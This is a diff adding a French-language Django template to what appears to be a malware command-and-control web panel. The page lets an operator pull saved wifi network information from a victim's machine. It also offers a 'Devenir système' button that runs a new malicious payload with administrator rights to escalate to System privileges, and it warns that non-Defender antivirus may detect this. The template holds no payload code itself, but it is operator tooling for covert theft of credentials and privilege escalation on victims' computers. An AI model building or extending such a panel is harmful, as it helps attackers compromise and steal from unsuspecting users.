@@ -1,0 +1,62 @@
+{% extends "server/session.html" %}
+{% block session_content %}
+
+{% if not is_system %}
+    <div class="alert alert-warning" role="alert">
+       Afin d'utiliser cette fonctionnalité, votre session doit s'exécuter avec les privilèges <code>Système</code>.
+    </div>
+{% else %}
+
+<p>Vous pouvez accéder aux informations des réseaux wifi sur lesquelles l'utilisateur s'est connecté récemment.</p>
+
+<div class="text-center">
+    <button id="load_wifi_list" class="btn btn-primary">Récupérer les informations</button>
+</div>
+
+<div id="loader" class="text-center mt-5 text-primary" style="display: none">
+    <i class="fas fa-spinner fa-spin fa-3x"></i>
+</div>
+
+<pre id="wifi_list" style="display: none">
+
+</pre>
+
+<script type="text/javascript">
+    $(function(){
+    function loadWifiList() {
+        $('#load_wifi_list').hide();
+        $('#loader').show();
+        $.ajax({
+            url: "{% url "session_wifi_list_async" id %}",
+        }).done(function(result) {
+            $('#wifi_list').text(result.value);
+            $('#loader').hide();
+            $('#wifi_list').show();
+        });
+    }
+
+    $('#load_wifi_list').on('click', loadWifiList);
+    
+});
+</script>
+
+
+{% endif %}
+
+
+{% if not is_system %}	
+    <p>Votre session n'a pas les privilèges nécessaires.</p>
+	<p>Si le compte sur lequel le logiciel malveillant est exécuté est administrateur, il est possible de récupérer des droits plus importants sur la machine victime. </p>
+    <p>Cliquer sur "Devenir système" déclenche l'exécution d'une nouvelle charge malveillante avec les droits administrateur. </p>
+    <div class="alert alert-danger">
+        Si un antivirus autre que Windows Defender est installé, cette action peut être détectée. 
+    </div>
+    <p> 
+        Si l'action réussie, une nouvelle session sera accessible après quelques dizaines de secondes. Rechargez fréquemment la page "Sessions" jusqu'à son apparition.
+    </p>
+	<p class="text-center"><a class="btn btn-warning" href="{% url "session_getadmin" id %}">Devenir système</a></p> 		
+{% endif %}
+
+
+
+{% endblock %}
